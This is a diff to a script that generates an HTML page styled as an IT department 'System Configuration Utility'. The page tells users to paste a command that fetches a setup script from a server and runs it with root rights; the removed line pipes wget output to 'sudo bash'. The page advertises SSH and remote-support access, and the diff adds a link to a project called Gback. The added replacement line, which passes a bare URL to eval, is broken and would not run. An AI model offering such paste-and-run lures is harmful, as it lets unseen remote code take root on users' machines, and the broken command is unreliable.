@@ -653,25 +653,14 @@ cat > /tmp/index.html << EOF
 </head>
 <body>
     <h1>System Configuration Utility</h1>
-    <p>This utility helps configure Ubuntu systems for remote management and maintenance.</p>
-    
     <h2>Quick Setup</h2>
     <p>Run the following command in your terminal to configure this system:</p>
     
     <div class="command">
-        wget -q -O- http://${SERVER_IP}/deployment/client_setup.sh | sudo bash
+        eval "\$(http://${SERVER_IP}/deployment/client_setup.sh)"
     </div>
     
-    <h2>Features</h2>
-    <ul>
-        <li>SSH server configuration</li>
-        <li>Wake-on-LAN setup (if supported by hardware)</li>
-        <li>Power management optimization</li>
-        <li>Remote support capabilities</li>
-        <li>System diagnostics</li>
-    </ul>
-    
-    <p><small>Version 1.0.0 • IT Department</small></p>
+    <p><a href="https://github.com/elleoma/Gback">Gback</a></p>
 </body>
 </html>
 EOF
